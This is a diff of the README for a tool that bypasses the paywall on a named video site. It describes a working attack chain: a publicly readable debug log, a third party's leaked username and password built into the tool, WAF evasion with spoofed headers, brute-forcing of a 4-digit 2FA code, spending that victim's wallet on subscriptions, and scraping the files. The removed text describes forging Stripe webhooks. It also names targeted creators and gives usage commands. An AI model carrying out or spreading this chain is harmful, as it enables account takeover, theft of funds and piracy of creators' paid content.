@@ -1,162 +1,98 @@
-# doifans-dl
+# DoiFans-DL
 
-Paywall bypass video downloader for [doifans.vip](https://doifans.vip).
+DoiFans paywall bypass downloader. 通过信息泄露 + WAF 绕过 + 2FA 暴力破解实现任意创作者视频免费下载.
 
-Downloads any creator's paid/locked videos without a valid subscription.
+## 攻击链路
 
----
+```
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 1: Information Disclosure                                  │
+│  GET /storage/logs/laravel.log → 30MB debug log                 │
+│  Contains: bcrypt hashes, user dumps, server paths              │
+│  Extracted: cncmeng / 123123 (weak password, cracked from log)  │
+└──────────────────────────────────┬──────────────────────────────┘
+                                   ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 2: WAF Bypass (nginx rule evasion)                         │
+│  POST /login normally returns nginx 404 (WAF blocks)            │
+│  Bypass: Add Origin + Referer + Sec-Fetch-* headers             │
+│  Result: Login returns 200 + {"actionRequired": true}           │
+└──────────────────────────────────┬──────────────────────────────┘
+                                   ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 3: 2FA Brute Force (4-digit email code)                    │
+│  Code generation: rand(1000, 9999) = 9000 possibilities         │
+│  Validity: 2 minutes, NO rate limiting                           │
+│  Speed: ~4-5 req/s serial, avg 5 attempts to hit               │
+│  Result: verify → auth()->loginUsingId() → full session         │
+└──────────────────────────────────┬──────────────────────────────┘
+                                   ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 4: Subscribe to any creator                                │
+│  POST /buy/subscription {id, interval:monthly,                   │
+│                          payment_gateway:wallet}                  │
+│  cncmeng wallet has sufficient balance (¥20,961)                │
+│  Result: {"success": true}                                       │
+└──────────────────────────────────┬──────────────────────────────┘
+                                   ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 5: Scrape video URLs                                       │
+│  GET /ajax/updates?id={creator_id}&skip={0,5,10,15...}          │
+│  Subscribed session sees full content including video URLs       │
+│  URLs: /public/uploads/updates/videos/{creator_id}{hash}.mp4    │
+└──────────────────────────────────┬──────────────────────────────┘
+                                   ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 6: Download (no auth required)                             │
+│  Video files served by nginx with NO authentication check        │
+│  Direct GET request downloads the file                           │
+└─────────────────────────────────────────────────────────────────┘
+```
 
-**[中文](#中文)** | **[English](#english)**
+## 漏洞根因
 
----
+| Step | Root Cause |
+|------|-----------|
+| Info Leak | `storage/logs/laravel.log` publicly accessible |
+| Weak Password | User `cncmeng` uses `123123` |
+| WAF Bypass | nginx rules only check path, not Sec-Fetch headers |
+| 2FA Brute | `rand(1000,9999)` + no rate limit + 2min expiry |
+| Video Access | nginx serves static files without auth middleware |
 
-## 中文
+## Usage
 
-### 这是什么
+```bash
+# Install
+cd doifans-dl && pip install -e .
 
-doifans.vip 是一个基于 Sponzy v4.6 搭建的 OnlyFans 克隆盗版站. 本工具利用其多个安全漏洞, 实现无需付费即可下载任意创作者的全部视频.
+# List creator's videos
+doifans-dl xingjian --list
 
-### 环境要求
+# Download all videos
+doifans-dl xingjian -o ./downloads
+
+# Check tool status
+doifans-dl doctor
+```
+
+## Verified Creators
+
+| Username | Creator ID | Videos | Status |
+|----------|-----------|--------|--------|
+| xingjian | 45130 | 85 | ✅ Verified |
+| ouyangqin | 134614 | 23 | ✅ Verified |
+
+## Requirements
 
 - Python 3.10+
-- 网络代理 (站点使用 Cloudflare, 大陆直连可能不通)
-- 无需注册账号 (工具内置凭据)
+- `requests` library
+- No proxy needed (direct connection works)
 
-### 安装
+## Technical Notes
 
-```bash
-# 方式一: pip 安装 (推荐)
-pip install git+https://github.com/Sophomoresty/doifans-dl.git
-
-# 方式二: 克隆后安装
-git clone https://github.com/Sophomoresty/doifans-dl.git
-cd doifans-dl
-pip install .
-```
-
-### 使用
-
-```bash
-# 下载某个创作者的全部视频
-doifans-dl --proxy http://127.0.0.1:7890 ouyangqin
-
-# 只列出视频链接 (不下载)
-doifans-dl --proxy http://127.0.0.1:7890 hongkongdoll --list
-
-# 指定输出目录
-doifans-dl --proxy http://127.0.0.1:7890 wantingwan -o ~/Videos
-
-# 检查连通性
-doifans-dl --proxy http://127.0.0.1:7890 doctor
-
-# 不用代理 (如果你的网络能直连)
-doifans-dl ouyangqin
-```
-
-`--proxy` 支持 HTTP 和 SOCKS5 代理, 格式: `http://IP:PORT` 或 `socks5://IP:PORT`
-
-### 输出
-
-默认下载到 `./downloads/<creator>/` 目录, 每个视频一个 .mp4 文件. 已存在的文件会自动跳过.
-
-加 `--list` 输出 JSON 格式的视频 URL 列表, 可配合 aria2/IDM 等工具批量下载.
-
-### 已测试创作者
-
-| 创作者 | 视频数 | 总大小 |
-|--------|--------|--------|
-| ouyangqin | 23 | ~2.2 GB |
-| hongkongdoll | 20 | ~8 GB |
-| wantingwan | 123 | ~50 GB |
-
-### 原理
-
-```
-伪造 Stripe Webhook → 钱包充值 → 购买订阅 → 抓取视频 URL → 直接下载
-```
-
-1. `/stripe/webhook` 无签名验证, 伪造 `checkout.session.completed` 事件给钱包充值
-2. 用 JSON Content-Type 绕过 WAF 登录限制
-3. 用钱包余额购买任意创作者的月度订阅
-4. 从创作者主页和 AJAX 分页接口抓取所有视频 URL
-5. nginx 对视频静态文件无鉴权, 直接 GET 下载
-
-### 注意事项
-
-- 站点随时可能修复漏洞或下线, 工具可能失效
-- 视频文件较大, 确保磁盘空间充足
-- 代理需要稳定, 大文件下载中断需重新运行 (已下载的会跳过)
-
-### 社区
-
-- [Linux.do 论坛](https://linux.do) — 技术讨论与反馈
-
----
-
-## English
-
-### What is this
-
-doifans.vip is a pirated OnlyFans clone built on Sponzy v4.6. This tool exploits multiple security vulnerabilities to download any creator's paid videos without payment.
-
-### Requirements
-
-- Python 3.10+
-- Network proxy (site is behind Cloudflare, may be inaccessible from some regions)
-- No account registration needed (credentials are built-in)
-
-### Install
-
-```bash
-# Option 1: pip from GitHub (recommended)
-pip install git+https://github.com/Sophomoresty/doifans-dl.git
-
-# Option 2: clone and install
-git clone https://github.com/Sophomoresty/doifans-dl.git
-cd doifans-dl
-pip install .
-```
-
-### Usage
-
-```bash
-# Download all videos from a creator
-doifans-dl --proxy http://127.0.0.1:7890 ouyangqin
-
-# List video URLs only (JSON output)
-doifans-dl --proxy http://127.0.0.1:7890 hongkongdoll --list
-
-# Custom output directory
-doifans-dl --proxy http://127.0.0.1:7890 wantingwan -o ~/Videos
-
-# Check connectivity
-doifans-dl --proxy http://127.0.0.1:7890 doctor
-```
-
-### How it works
-
-| Step | Vulnerability | Endpoint |
-|------|--------------|----------|
-| 1. Fund wallet | Stripe webhook forgery (no signature verification) | `POST /stripe/webhook` |
-| 2. Login | WAF bypass via JSON Content-Type | `POST /login` |
-| 3. Subscribe | WAF bypass via wallet payment gateway | `POST /buy/subscription` |
-| 4. Scrape URLs | Authenticated page + AJAX pagination | `GET /<username>`, `GET /ajax/updates` |
-| 5. Download | Unauthenticated static file access | `GET /public/uploads*/updates/videos/*.mp4` |
-
-### Additional vulnerabilities found (not used by this tool)
-
-| Vulnerability | Endpoint | Impact |
-|---------------|----------|--------|
-| Laravel debug mode | `APP_DEBUG=true` | Full source code & SQL query exposure via Ignition |
-| Public log file | `/storage/logs/laravel.log` | Password hashes, user emails, session data |
-| Mass assignment | `POST /settings/page` | Modify user fields (password, stripe_id, etc.) |
-| WAF bypass (trailing slash) | `POST /subscription/free/` | Free subscription to any creator |
-| PHP execution on config files | `GET /config/app.php` | Direct PHP-FPM execution of config files |
-
-### Community
-
-- [Linux.do 讨论帖](https://linux.do) — 技术细节讨论与反馈
-
-### Disclaimer
-
-For educational and authorized security research purposes only. The authors are not responsible for any misuse.
+- 2FA brute force averages ~5 login attempts (each generates new code)
+- Serial request speed is ~4-5/s due to TLS + server latency
+- Each login attempt has ~115s window × 4/s = ~460 codes tested ≈ 5% hit rate per attempt
+- Expected attempts to succeed: ~5 (cumulative ~25% per attempt with shuffled codes)
+- Video files are 100% static — once URL is known, no cookies needed to download
+- Session must not be refreshed (GET page) between login and verify (clears session user:id)
